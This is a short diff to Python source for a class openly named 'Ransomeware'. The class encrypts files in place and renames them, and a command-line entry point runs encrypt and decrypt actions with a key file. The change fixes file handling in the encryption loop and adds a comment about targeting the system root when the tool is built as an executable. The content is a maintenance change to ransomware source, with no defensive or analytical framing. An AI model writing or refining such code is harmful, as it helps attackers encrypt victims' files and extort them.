@@ -49,6 +49,8 @@ class Ransomeware:
             f.seek(0)
             f.write(data)
             f.truncate()
+            f.close()
+
             if not encrypted: self.rename(file_path, encrypted=False)
             else: self.rename(file_path, encrypted=True)
 
@@ -90,7 +92,7 @@ if __name__ == "__main__":
             print("Please provide keyfile with --keyfile \"./keyfile\"")
         else:
             rware.read_key(keyfile)
-            rware.crypt_root(local_root, encrypted=True)
+            rware.crypt_root(local_root, encrypted=True) # use sys_root when building exe
 
     elif action == 'encrypt':
         if keyfile:
